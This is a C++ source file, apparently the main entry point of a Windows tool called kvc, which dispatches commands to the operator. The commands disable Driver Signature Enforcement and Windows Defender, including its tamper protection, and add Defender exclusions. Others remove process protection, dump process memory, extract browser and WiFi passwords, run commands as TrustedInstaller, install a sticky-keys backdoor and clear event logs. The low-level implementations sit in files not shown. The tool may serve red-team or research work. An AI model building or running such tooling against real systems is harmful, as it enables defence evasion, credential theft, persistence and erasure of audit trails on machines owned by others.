// Kernel Vulnerability Capabilities Framework - Main Application Entry Point

#include "common.h"
#include "Controller.h"
#include "DSEBypass.h"
#include "HelpSystem.h"
#include "DefenderManager.h"
#include "DefenderUI.h"
#include "ProcessManager.h"
#include "ServiceManager.h"
#include "HiveManager.h"
#include "ModuleManager.h"
#include <signal.h>
#include <charconv>
#include <Shlobj.h>
#include <functional>
#include <unordered_map>
#include <string>
#include <vector>
#include <sstream>

#pragma comment(lib, "Shell32.lib")

// ============================================================================
// GLOBAL STATE
// ============================================================================

std::unique_ptr<Controller> g_controller;
volatile bool g_interrupted = false;

// ============================================================================
// HELPERS
// ============================================================================

void CleanupDriver() noexcept {
    if (g_controller) g_controller->PerformAtomicCleanup();
}

void SignalHandler(int signum) {
    if (signum == SIGINT) {
        g_interrupted = true;
        ERROR(L"\nInterrupted by user - performing emergency cleanup...");
        CleanupDriver();
        exit(130);
    }
}

// Helper to remove whitespace from both ends of a string
std::wstring Trim(const std::wstring& str) {
    size_t first = str.find_first_not_of(L" \t");
    if (first == std::wstring::npos) return L"";
    size_t last = str.find_last_not_of(L" \t");
    return str.substr(first, last - first + 1);
}

std::optional<DWORD> ParsePid(std::wstring_view pidStr) noexcept {
    if (pidStr.empty()) return std::nullopt;
    std::string narrowStr;
    narrowStr.reserve(pidStr.size());
    for (wchar_t wc : pidStr) {
        if (wc > 127) return std::nullopt;
        narrowStr.push_back(static_cast<char>(wc));
    }
    DWORD result = 0;
    auto [ptr, ec] = std::from_chars(narrowStr.data(), narrowStr.data() + narrowStr.size(), result);
    return (ec == std::errc{} && ptr == narrowStr.data() + narrowStr.size()) ? std::make_optional(result) : std::nullopt;
}

bool IsNumeric(std::wstring_view str) noexcept {
    if (str.empty()) return false;
    for (wchar_t ch : str) if (ch < L'0' || ch > L'9') return false;
    return true;
}

bool IsHelpFlag(std::wstring_view arg) noexcept {
    return (arg == L"/?" || arg == L"/help" || arg == L"/h" || 
            arg == L"-?" || arg == L"-help" || arg == L"-h" || 
            arg == L"--help" || arg == L"--h" || arg == L"help" || arg == L"?");
}

bool CheckKvcPassExists() noexcept {
    if (GetFileAttributesW(L"kvc_pass.exe") != INVALID_FILE_ATTRIBUTES) return true;
    wchar_t systemDir[MAX_PATH];
    if (GetSystemDirectoryW(systemDir, MAX_PATH) > 0) {
        std::wstring path = std::wstring(systemDir) + L"\\kvc_pass.exe";
        return GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES;
    }
    return false;
}

bool InitiateSystemRestart() noexcept {
    HANDLE token; TOKEN_PRIVILEGES tp; LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) return false;
    if (!LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &luid)) { CloseHandle(token); return false; }
    tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool success = AdjustTokenPrivileges(token, FALSE, &tp, 0, nullptr, nullptr);
    CloseHandle(token);
    return success ? (ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_RECONFIGURE) != 0) : false;
}

// ============================================================================
// COMMAND HANDLERS
// ============================================================================

int HandleDriverCommand(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        ERROR(L"Missing driver subcommand");
        ERROR(L"Usage: kvc driver <load|reload|stop|remove> <path|name>");
        return 1;
    }
    std::wstring subCmd = StringUtils::ToLowerCaseCopy(argv[2]);

    if (subCmd == L"load") {
        if (argc < 4) {
            ERROR(L"Missing driver path");
            ERROR(L"Usage: kvc driver load <path> [-s <0-4>]");
            return 1;
        }
        DWORD startType = SERVICE_DEMAND_START;
        if (argc >= 6 && std::wstring(argv[4]) == L"-s") {
            startType = static_cast<DWORD>(_wtoi(argv[5]));
        }
        return g_controller->LoadExternalDriver(argv[3], startType) ? 0 : 2;
    }
    
    if (argc < 4) {
        ERROR(L"Missing driver name/path");
        // Uproszczony help dla reszty
        ERROR(L"Usage: kvc driver <load|reload|stop|remove> <path|name>");
        return 1;
    }

    if (subCmd == L"reload") return g_controller->ReloadExternalDriver(argv[3]) ? 0 : 2;
    if (subCmd == L"stop") return g_controller->StopExternalDriver(argv[3]) ? 0 : 2;
    if (subCmd == L"remove") return g_controller->RemoveExternalDriver(argv[3]) ? 0 : 2;
    
    ERROR(L"Unknown driver subcommand: %s", subCmd.c_str());
    return 1;
}

int HandleUninstall(int, wchar_t**) {
    INFO(L"Uninstalling Kernel Vulnerability Capabilities Framework service...");
    bool success = ServiceManager::UninstallService();
    
    INFO(L"Cleaning up registry configuration...");
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        LONG result = RegDeleteTreeW(hKey, L"kvc");
        if (result == ERROR_SUCCESS) SUCCESS(L"Registry configuration cleaned successfully");
        else if (result == ERROR_FILE_NOT_FOUND) INFO(L"No registry configuration found to clean");
        else ERROR(L"Failed to clean registry configuration: %d", result);
        RegCloseKey(hKey);
    }
    return success ? 0 : 1;
}

int HandleServiceCommand(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        ERROR(L"Missing service command: start, stop, restart");
        return 1;
    }
    std::wstring subCmd = argv[2];

    if (subCmd == L"start") {
        INFO(L"Starting Kernel Vulnerability Capabilities Framework service...");
        return ServiceManager::StartServiceProcess() ? (SUCCESS(L"Service started successfully"), 0) : (ERROR(L"Failed to start service"), 1);
    }
    if (subCmd == L"stop") {
        INFO(L"Stopping Kernel Vulnerability Capabilities Framework service...");
        return ServiceManager::StopServiceProcess() ? (SUCCESS(L"Service stopped successfully"), 0) : (ERROR(L"Failed to stop service"), 1);
    }
    if (subCmd == L"restart") {
		INFO(L"Restarting Kernel Vulnerability Capabilities Framework service...");
		INFO(L"Stopping service...");
		bool stopped = ServiceManager::StopServiceProcess();
		INFO(L"Starting service...");
		bool started = ServiceManager::StartServiceProcess();
		return (stopped && started) ? 0 : 1;
    }
    if (subCmd == L"status") {
        INFO(L"Checking Kernel Vulnerability Capabilities Framework service status...");
        const bool installed = IsServiceInstalled();
        const bool running = installed ? IsServiceRunning() : false;
        
        std::wcout << L"\n";
        INFO(L"Service Information:");
        INFO(L" Name: %s", ServiceConstants::SERVICE_NAME);
        INFO(L" Display Name: %s", ServiceConstants::SERVICE_DISPLAY_NAME);
        std::wcout << L"\n";
        
        if (installed) {
            SUCCESS(L"Installation Status: INSTALLED");
            if (running) {
                SUCCESS(L"Runtime Status: RUNNING");
                SUCCESS(L"Service is operational and ready for kernel operations");
            } else {
                ERROR(L"Runtime Status: STOPPED");
                INFO(L"Use 'kvc service start' to start the service");
            }
        } else {
            ERROR(L"Installation Status: NOT INSTALLED");
            INFO(L"Use 'kvc install' to install the service first");
        }
        std::wcout << L"\n";
        return 0;
    }
    ERROR(L"Unknown service command: %s", subCmd.c_str());
    return 1;
}

int HandleDseCommand(int argc, wchar_t* argv[]) {
    // 1. STATUS CHECK
    if (argc < 3) {
        INFO(L"Checking Driver Signature Enforcement status...");
        
        ULONG_PTR ciOptionsAddr = 0;
        DWORD value = 0;
        
        if (!g_controller->GetDSEStatus(ciOptionsAddr, value)) {
            ERROR(L"Failed to retrieve DSE status");
            return 2;
        }
        
        bool dseEnabled = (value & 0x6) != 0;
        bool hvciEnabled = (value & 0x0001C000) == 0x0001C000;
        
        std::wcout << L"\n";
        INFO(L"DSE Status Information:");
        INFO(L"g_CiOptions address: 0x%llX", ciOptionsAddr);
        INFO(L"g_CiOptions value: 0x%08X", value);
        
        auto dseNGCallback = SessionManager::GetOriginalCiCallback();
        if (dseNGCallback != 0) {
            INFO(L"DSE-NG (Safe Mode) active - callback saved: 0x%llX", dseNGCallback);
        }

        std::wcout << L"\n";
        
        if (hvciEnabled) {
            INFO(L"Recommended: 'kvc dse off --safe' - modern method (requires reboot, preserves VBS)");
            INFO(L"Legacy: 'kvc dse off' - HVCI bypass (requires reboot, disables Secure Kernel)");
        }
        else if (dseEnabled) {
            SUCCESS(L"DSE can be safely disabled using 'kvc dse off --safe'");
        } else {
            INFO(L"Driver signature enforcement: DISABLED");
            INFO(L"Unsigned drivers allowed");
            INFO(L"Use 'kvc dse on --safe' to restore kernel protection");
        }
        std::wcout << L"\n";
        return 0;
    }
    
    // 2. ACTIONS
    std::wstring subCmd = argv[2];
    bool safe = (argc >= 4 && std::wstring(argv[3]) == L"--safe");

    if (subCmd == L"off") {
        if (safe) {
            INFO(L"Executing Next-Gen DSE Bypass (PDB-based)...");
            return g_controller->DisableDSESafe() ? 0 : 2;
        }
        INFO(L"Disabling driver signature enforcement...");
        return g_controller->DisableDSE() ? 0 : 2;
    }
    else if (subCmd == L"on") {
        if (safe) {
            INFO(L"Restoring DSE using Next-Gen method...");
            return g_controller->RestoreDSESafe() ? 0 : 2;
        }
        INFO(L"Restoring driver signature enforcement...");
        return g_controller->RestoreDSE() ? 0 : 2;
    }
    else {
        ERROR(L"Unknown DSE command: %s", subCmd.c_str());
        ERROR(L"Usage: kvc dse [off|on]  or  kvc dse  (status)");
        return 1;
    }
}

int HandleSecEngineCommand(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        ERROR(L"Missing subcommand for secengine. Usage: kvc secengine <disable|enable|status>");
        return 1;
    }
    std::wstring_view sub = argv[2];
    bool restart = (argc > 3 && std::wstring(argv[3]) == L"--restart");

    if (sub == L"disable") {
        INFO(L"Disabling Windows Defender (requires restart)...");
        if (DefenderManager::DisableSecurityEngine()) {
            SUCCESS(L"Security engine disabled successfully - restart required");
            if (restart) { INFO(L"Initiating system restart..."); InitiateSystemRestart(); }
            return 0;
        }
        return 1;
    }
    if (sub == L"enable") {
        INFO(L"Enabling Windows Defender (requires restart)...");
        if (DefenderManager::EnableSecurityEngine()) {
            SUCCESS(L"Security engine enabled successfully - restart required");
            if (restart) { INFO(L"Initiating system restart..."); InitiateSystemRestart(); }
            return 0;
        }
        return 1;
    }
    if (sub == L"status") {
        auto status = DefenderManager::GetSecurityEngineStatus();
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        
        if (status == DefenderManager::SecurityState::ENABLED) {
            INFO(L"Security Engine Status: ENABLED (Active Protection)");
            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
            std::wcout << L" Windows Defender is actively protecting the system\n";
        } else if (status == DefenderManager::SecurityState::DISABLED) {
            INFO(L"Security Engine Status: DISABLED (Inactive Protection)");
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
            std::wcout << L" Windows Defender protection is disabled\n";
        } else {
            INFO(L"Security Engine Status: UNKNOWN (Cannot determine state)");
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
            std::wcout << L" Unable to determine Defender protection state\n";
        }
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE); // Reset
        return 0;
    }
    
    ERROR(L"Invalid secengine subcommand: %s", std::wstring(sub).c_str());
    ERROR(L"Valid subcommands: disable, enable, status");
    return 1;
}

int HandleModulesCommand(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        ERROR(L"Missing PID/process name argument");
        ERROR(L"Usage: kvc modules <PID|process_name> [read <module> [offset] [size]]");
        return 1;
    }
    std::wstring_view target = argv[2];
    DWORD pid = 0;

    if (IsNumeric(target)) {
        if (auto p = ParsePid(target)) pid = p.value(); else { ERROR(L"Invalid PID format: %s", target.data()); return 1; }
    } else {
        auto match = g_controller->ResolveNameWithoutDriver(std::wstring(target));
        if (!match) { ERROR(L"Process not found: %s", target.data()); return 1; }
        pid = match->Pid;
        INFO(L"Resolved '%s' to PID %lu", match->ProcessName.c_str(), pid);
    }

    if (argc >= 4 && StringUtils::ToLowerCaseCopy(argv[3]) == L"read") {
        if (argc < 5) {
            ERROR(L"Missing module name for read operation");
            ERROR(L"Usage: kvc modules <PID> read <module_name> [offset] [size]");
            return 1;
        }
        std::wstring module = argv[4];
        ULONG_PTR offset = 0;
        size_t size = 256;
        if (argc >= 6) offset = std::wcstoull(argv[5], nullptr, 0); 
        if (argc >= 7) size = std::wcstoull(argv[6], nullptr, 0);
        return g_controller->ReadModuleMemory(pid, module, offset, size) ? 0 : 2;
    }
    return g_controller->EnumerateProcessModules(pid) ? 0 : 2;
}

int HandleProtectionCommand(int argc, wchar_t* argv[], bool isSet) {
    if (argc < 5) {
        ERROR(L"Missing arguments: <PID/process_name> <PP|PPL> <SIGNER_TYPE>");
        return 1;
    }
    std::wstring target = argv[2];
    std::wstring level = argv[3];
    std::wstring signer = argv[4];

    // Batch processing
    if (target.find(L',') != std::wstring::npos) {
        std::vector<std::wstring> targets;
        std::wstringstream ss(target);
        std::wstring item;
        while (std::getline(ss, item, L',')) {
            std::wstring trimmed = Trim(item);
            if (!trimmed.empty()) targets.push_back(trimmed);
        }
        
        if (targets.empty()) { ERROR(L"No valid targets in comma-separated list"); return 1; }
        INFO(L"Batch %s operation: %zu targets", isSet ? L"set" : L"protect", targets.size());
        
        return (isSet ? g_controller->SetMultipleProcessesProtection(targets, level, signer) : 
                        g_controller->ProtectMultipleProcesses(targets, level, signer)) ? 0 : 2;
    }

    // Single processing
    if (IsNumeric(target)) {
        auto pid = ParsePid(target);
        if (!pid) { ERROR(L"Invalid PID format: %s", target.c_str()); return 1; }
        return (isSet ? g_controller->SetProcessProtection(pid.value(), level, signer) : 
                        g_controller->ProtectProcess(pid.value(), level, signer)) ? 0 : 2;
    } else {
        return (isSet ? g_controller->SetProcessProtectionByName(target, level, signer) : 
                        g_controller->ProtectProcessByName(target, level, signer)) ? 0 : 2;
    }
}

int HandleUnprotectCommand(int argc, wchar_t* argv[]) {
    if (argc < 3) { ERROR(L"Missing PID/process name argument"); return 1; }
    std::wstring target = argv[2];
    
    if (target == L"all") return g_controller->UnprotectAllProcesses() ? 0 : 2;
    
    // Batch
    if (target.find(L',') != std::wstring::npos) {
        std::vector<std::wstring> list;
        std::wstringstream ss(target); 
        std::wstring s;
        while (std::getline(ss, s, L',')) {
            std::wstring trimmed = Trim(s);
            if (!trimmed.empty()) list.push_back(trimmed);
        }
        return g_controller->UnprotectMultipleProcesses(list) ? 0 : 2;
    }
    
    if (Utils::GetSignerTypeFromString(target)) return g_controller->UnprotectBySigner(target) ? 0 : 2;
    
    if (IsNumeric(target)) {
         auto pid = ParsePid(target);
         if(!pid) { ERROR(L"Invalid PID format: %s", target.c_str()); return 1; }
         return g_controller->UnprotectProcess(pid.value()) ? 0 : 2;
    }
    return g_controller->UnprotectProcessByName(target) ? 0 : 2;
}

int HandleBrowserPasswords(int argc, wchar_t* argv[]) {
    std::wstring browserType = L"chrome";
    std::wstring outputPath = L".";
    
    for (int i = 2; i < argc; i++) {
        std::wstring arg = argv[i];
        if (arg == L"--chrome") browserType = L"chrome";
        else if (arg == L"--brave") browserType = L"brave";
        else if (arg == L"--edge") browserType = L"edge";
        else if (arg == L"--all") browserType = L"all";
        else if (arg == L"--output" || arg == L"-o") {
            if (i + 1 < argc) outputPath = argv[++i];
            else { ERROR(L"Missing path for --output argument"); return 1; }
        }
        else { ERROR(L"Unknown argument: %s", arg.c_str()); return 1; }
    }

    if (browserType == L"all") {
        if (!CheckKvcPassExists()) { ERROR(L"--all requires kvc_pass.exe"); return 1; }
        if (!g_controller->ExportBrowserData(outputPath, browserType)) { ERROR(L"Failed to extract from all browsers"); return 1; }
        return 0;
    }

    if (browserType == L"edge") {
        if (CheckKvcPassExists()) {
            INFO(L"Full Edge extraction: JSON (kvc_pass) + HTML/TXT (KVC DPAPI)");
            if (!g_controller->ExportBrowserData(outputPath, browserType)) ERROR(L"kvc_pass extraction failed");
            INFO(L"Generating HTML/TXT reports...");
            g_controller->ShowPasswords(outputPath);
            SUCCESS(L"Edge extraction complete");
        } else {
            INFO(L"Using built-in Edge DPAPI extraction (HTML/TXT only)");
            g_controller->ShowPasswords(outputPath);
        }
        return 0;
    }

    if (!g_controller->ExportBrowserData(outputPath, browserType)) { ERROR(L"Failed to export browser passwords"); return 1; }
    return 0;
}

// ============================================================================
// MAIN APPLICATION ENTRY POINT
// ============================================================================

int wmain(int argc, wchar_t* argv[])
{
    signal(SIGINT, SignalHandler);
    
    if (argc >= 2 && std::wstring_view(argv[1]) == L"--service") {
        return ServiceManager::RunAsService();
    }
    
    if (argc < 2 || IsHelpFlag(argv[1])) {
        HelpSystem::PrintUsage(argv[0]);
        return argc < 2 ? 1 : 0;
    }

    try {
        g_controller = std::make_unique<Controller>();
    } catch (...) {
        ERROR(L"Failed to initialize Controller");
        return 3;
    }

    std::wstring command = argv[1];

    using CommandHandler = std::function<int(int, wchar_t**)>;
    
    static const std::unordered_map<std::wstring, CommandHandler> commandMap = {
        // --- Service ---
        {L"install", [](int, wchar_t**) {
            wchar_t exePath[MAX_PATH];
            if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) { ERROR(L"Failed to get current executable path"); return 1; }
            INFO(L"Installing Kernel Vulnerability Capabilities Framework service...");
            return ServiceManager::InstallService(exePath) ? 0 : 1;
        }},
        {L"uninstall", HandleUninstall},
        {L"service", HandleServiceCommand},

        // --- DSE & Driver ---
        {L"dse", HandleDseCommand},
        {L"driver", HandleDriverCommand},

        // --- Process Ops ---
        {L"list", [](int, wchar_t**) {
            g_controller->m_sessionMgr.DetectAndHandleReboot();
            return g_controller->ListProtectedProcesses() ? 0 : 2;
        }},
        {L"info", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing PID/process name argument for detailed information"); return 1; }
            if (IsNumeric(argv[2])) {
                auto pid = ParsePid(argv[2]);
                if(!pid) { ERROR(L"Invalid PID format: %s", argv[2]); return 1; }
                return g_controller->PrintProcessInfo(pid.value()) ? 0 : 2;
            }
            auto match = g_controller->ResolveNameWithoutDriver(argv[2]);
            if (match) return g_controller->PrintProcessInfo(match->Pid) ? 0 : 2;
            return 2;
        }},
        {L"get", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing PID/process name argument"); return 1; }
            if (IsNumeric(argv[2])) {
                auto pid = ParsePid(argv[2]);
                if(!pid) { ERROR(L"Invalid PID format: %s", argv[2]); return 1; }
                return g_controller->GetProcessProtection(pid.value()) ? 0 : 2;
            }
            return g_controller->GetProcessProtectionByName(argv[2]) ? 0 : 2;
        }},
        {L"kill", [](int argc, wchar_t** argv) {
            ProcessManager::HandleKillCommand(argc, argv, g_controller.get());
            return 0;
        }},
        {L"dump", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing PID/process name argument"); return 1; }
            std::wstring outPath = (argc >= 4) ? argv[3] : L"";
            if (outPath.empty()) {
                wchar_t* dl; 
                if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &dl) == S_OK) { outPath = dl; outPath += L"\\"; CoTaskMemFree(dl); }
                else outPath = L".\\";
            }
            if (IsNumeric(argv[2])) {
                auto pid = ParsePid(argv[2]);
                if (!pid) { ERROR(L"Invalid PID format: %s", argv[2]); return 1; }
                return g_controller->DumpProcess(pid.value(), outPath) ? 0 : 2;
            }
            return g_controller->DumpProcessByName(argv[2], outPath) ? 0 : 2;
        }},

        // --- Modules ---
        {L"modules", HandleModulesCommand},
        {L"mods",    HandleModulesCommand},

        // --- Protection ---
        {L"protect", [](int argc, wchar_t** argv) { return HandleProtectionCommand(argc, argv, false); }},
        {L"set",     [](int argc, wchar_t** argv) { return HandleProtectionCommand(argc, argv, true); }},
        {L"set-signer", [](int argc, wchar_t** argv) {
            if (argc < 5) { ERROR(L"Missing arguments: <CURRENT_SIGNER> <PP|PPL> <NEW_SIGNER>"); return 1; }
            std::wstring cs = argv[2];
            if (!Utils::GetSignerTypeFromString(cs)) { ERROR(L"Invalid signer type: %s", cs.c_str()); return 1; }
            return g_controller->SetProtectionBySigner(cs, argv[3], argv[4]) ? 0 : 2;
        }},
        {L"unprotect", HandleUnprotectCommand},
        {L"unprotect-signer", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing signer type argument"); return 1; }
            return g_controller->UnprotectBySigner(argv[2]) ? 0 : 2;
        }},
        {L"restore", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing argument: <signer_name|all>"); return 1; }
            std::wstring t = argv[2];
            return (t == L"all") ? (g_controller->RestoreAllProtection() ? 0 : 2) 
                                 : (g_controller->RestoreProtectionBySigner(t) ? 0 : 2);
        }},
        {L"history", [](int, wchar_t**) { g_controller->ShowSessionHistory(); return 0; }},
        {L"cleanup-sessions", [](int, wchar_t**) { g_controller->m_sessionMgr.CleanupAllSessionsExceptCurrent(); return 0; }},
        {L"list-signer", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing signer type argument"); return 1; }
            return g_controller->ListProcessesBySigner(argv[2]) ? 0 : 1;
        }},

        // --- Defender & Security ---
        {L"secengine", HandleSecEngineCommand},
        {L"disable-defender", [](int argc, wchar_t** argv) {
            INFO(L"Disabling Windows Defender (requires restart)...");
            bool r = DefenderManager::DisableSecurityEngine();
            if(r) { SUCCESS(L"Windows Defender disabled successfully"); INFO(L"System restart required to apply changes"); }
            if(r && argc >= 3 && std::wstring(argv[2]) == L"--restart") { INFO(L"Initiating system restart..."); InitiateSystemRestart(); }
            return r ? 0 : 2;
        }},
        {L"enable-defender", [](int, wchar_t**) { return DefenderManager::EnableSecurityEngine() ? 0 : 2; }},
        
        // --- Defender UI Automation ---
        {L"rtp", [](int argc, wchar_t** argv) {
            if (argc < 3) { INFO(L"Usage: kvc rtp <on|off|status>"); return 1; }
            WindowsDefenderAutomation wda;
            if (!wda.openDefenderSettings()) { ERROR(L"Failed to open Windows Security"); return 1; }
            std::wstring act = argv[2];
            bool res = false;
            if (act == L"on") { res = wda.enableRealTimeProtection(); if(res) SUCCESS(L"Real-Time Protection enabled successfully"); else ERROR(L"Failed to enable Real-Time Protection"); }
            else if (act == L"off") { res = wda.disableRealTimeProtection(); if(res) SUCCESS(L"Real-Time Protection disabled successfully"); else ERROR(L"Failed to disable Real-Time Protection"); }
            else if (act == L"status") { wda.getRealTimeProtectionStatus(); res = true; }
            else { ERROR(L"Unknown action: %s", act.c_str()); INFO(L"Usage: kvc rtp <on|off|status>"); }
            wda.closeSecurityWindow();
            return res ? 0 : 1;
        }},
        {L"tp", [](int argc, wchar_t** argv) {
            if (argc < 3) { INFO(L"Usage: kvc tp <on|off|status>"); return 1; }
            WindowsDefenderAutomation wda;
            if (!wda.openDefenderSettings()) { ERROR(L"Failed to open Windows Security"); return 1; }
            std::wstring act = argv[2];
            bool res = false;
            if (act == L"on") { res = wda.enableTamperProtection(); if(res) SUCCESS(L"Tamper Protection enabled successfully"); else ERROR(L"Failed to enable Tamper Protection"); }
            else if (act == L"off") { res = wda.disableTamperProtection(); if(res) SUCCESS(L"Tamper Protection disabled successfully"); else ERROR(L"Failed to disable Tamper Protection"); }
            else if (act == L"status") { wda.getTamperProtectionStatus(); res = true; }
            else { ERROR(L"Unknown action: %s", act.c_str()); INFO(L"Usage: kvc tp <on|off|status>"); }
            wda.closeSecurityWindow();
            return res ? 0 : 1;
        }},

        // --- Exclusions ---
        {L"add-exclusion", [](int argc, wchar_t** argv) {
            if (argc < 3) { // Legacy: add self
                wchar_t p[MAX_PATH]; if(GetModuleFileNameW(nullptr, p, MAX_PATH)==0){ ERROR(L"Failed to get current executable path"); return 1; }
                INFO(L"Adding self to Defender exclusions: %s", p);
                return g_controller->AddToDefenderExclusions(p) ? 0 : 2;
            }
            std::wstring sub = StringUtils::ToLowerCaseCopy(argv[2]);
            if (argc < 4) return g_controller->AddToDefenderExclusions(argv[2]) ? 0 : 2; // Legacy
            if (sub == L"paths" || sub == L"path") return g_controller->AddPathExclusion(argv[3]) ? 0 : 2;
            if (sub == L"processes" || sub == L"process") return g_controller->AddProcessExclusion(argv[3]) ? 0 : 2;
            if (sub == L"extensions" || sub == L"extension") return g_controller->AddExtensionExclusion(argv[3]) ? 0 : 2;
            if (sub == L"ipaddresses" || sub == L"ip") return g_controller->AddIpAddressExclusion(argv[3]) ? 0 : 2;
            // Fallback for legacy
            return g_controller->AddToDefenderExclusions(argv[2]) ? 0 : 2;
        }},
        {L"remove-exclusion", [](int argc, wchar_t** argv) {
            if (argc < 3) { wchar_t p[MAX_PATH]; if(GetModuleFileNameW(nullptr, p, MAX_PATH)==0){ ERROR(L"Failed to get current executable path"); return 1; } INFO(L"Removing self from Defender exclusions: %s", p); return g_controller->RemoveFromDefenderExclusions(p) ? 0 : 2; }
            std::wstring sub = StringUtils::ToLowerCaseCopy(argv[2]);
            if (argc < 4) return g_controller->RemoveFromDefenderExclusions(argv[2]) ? 0 : 2; // Legacy
            if (sub == L"paths" || sub == L"path") return g_controller->RemovePathExclusion(argv[3]) ? 0 : 2;
            if (sub == L"processes" || sub == L"process") return g_controller->RemoveProcessExclusion(argv[3]) ? 0 : 2;
            if (sub == L"extensions" || sub == L"extension") return g_controller->RemoveExtensionExclusion(argv[3]) ? 0 : 2;
            if (sub == L"ipaddresses" || sub == L"ip") return g_controller->RemoveIpAddressExclusion(argv[3]) ? 0 : 2;
            return g_controller->RemoveFromDefenderExclusions(argv[2]) ? 0 : 2;
        }},

        // --- Passwords ---
        {L"browser-passwords", HandleBrowserPasswords},
        {L"bp",                HandleBrowserPasswords},
        {L"export", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing export subcommand: secrets"); return 1; }
            if (std::wstring(argv[2]) == L"secrets") {
                std::wstring path = (argc >= 4) ? argv[3] : PathUtils::GetDefaultSecretsOutputPath();
                if (path.empty()) { ERROR(L"Failed to determine default output path"); return 1; }
                if (CheckKvcPassExists()) {
                    INFO(L"Extracting browser passwords via COM elevation...");
                    if (!g_controller->ExportBrowserData(path, L"edge")) INFO(L"Edge COM extraction failed");
                    if (!g_controller->ExportBrowserData(path, L"chrome")) INFO(L"Chrome extraction failed");
                } else {
                    ERROR(L"kvc_pass.exe not found - Chrome extraction unavailable");
                    INFO(L"Edge will fallback to DPAPI (no JSON output)");
                }
                INFO(L"Extracting WiFi and generating DPAPI reports...");
                g_controller->ShowPasswords(path);
                return 0;
            }
            ERROR(L"Unknown export subcommand: %s", argv[2]); return 1;
        }},

        // --- System & Registry ---
        {L"trusted", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing command for elevated execution"); return 1; }
            std::wstring cmd;
            for (int i = 2; i < argc; i++) { if (i > 2) cmd += L" "; cmd += argv[i]; }
            return g_controller->RunAsTrustedInstaller(cmd) ? 0 : 2;
        }},
        {L"install-context", [](int, wchar_t**) { return g_controller->AddContextMenuEntries() ? 0 : 1; }},
        {L"shift",   [](int, wchar_t**) { INFO(L"Installing sticky keys backdoor..."); return g_controller->InstallStickyKeysBackdoor() ? 0 : 2; }},
        {L"unshift", [](int, wchar_t**) { INFO(L"Removing sticky keys backdoor..."); return g_controller->RemoveStickyKeysBackdoor() ? 0 : 2; }},
        {L"registry", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing registry subcommand: backup, restore, defrag"); return 1; }
            std::wstring sub = argv[2];
            HiveManager hm;
            if (sub == L"backup") return hm.Backup((argc >= 4) ? argv[3] : L"") ? 0 : 2;
            if (sub == L"restore") { if(argc<4){ERROR(L"Missing source path for restore"); return 1;} return hm.Restore(argv[3]) ? 0 : 2; }
            if (sub == L"defrag") return hm.Defrag((argc >= 4) ? argv[3] : L"") ? 0 : 2;
            ERROR(L"Unknown registry subcommand: %s", sub.c_str()); return 1;
        }},

        // --- Misc ---
        {L"watermark", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing subcommand. Usage: kvc watermark <remove|restore|status>"); return 1; }
            std::wstring sub = argv[2];
            if (sub == L"remove") { INFO(L"Removing Windows desktop watermark..."); return g_controller->RemoveWatermark() ? 0 : 2; }
            if (sub == L"restore") { INFO(L"Restoring Windows desktop watermark..."); return g_controller->RestoreWatermark() ? 0 : 2; }
            if (sub == L"status") { std::wstring s=g_controller->GetWatermarkStatus(); INFO(L"Watermark status: %s", s.c_str()); return 0; }
            ERROR(L"Unknown watermark subcommand: %s", sub.c_str()); return 1;
        }},
        {L"wm", [](int argc, wchar_t** argv) { return commandMap.at(L"watermark")(argc, argv); }},
        {L"setup", [](int, wchar_t**) { INFO(L"Loading and processing kvc.dat combined binary..."); return g_controller->LoadAndSplitCombinedBinaries() ? 0 : 2; }},
        {L"evtclear", [](int, wchar_t**) { return g_controller->ClearSystemEventLogs() ? 0 : 2; }}
    };

    // ========================================================================
    // EXECUTION
    // ========================================================================

    try {
        auto it = commandMap.find(command);
        if (it != commandMap.end()) {
            int result = it->second(argc, argv);
            CleanupDriver();
            return result;
        } else {
            HelpSystem::PrintUnknownCommandMessage(command);
            CleanupDriver();
            return 1;
        }
    }
    catch (const std::exception& e) {
        ERROR(L"Exception: %S", e.what());
        CleanupDriver();
        return 3;
    }
    catch (...) {
        ERROR(L"Unknown exception occurred");
        CleanupDriver();
        return 3;
    }
}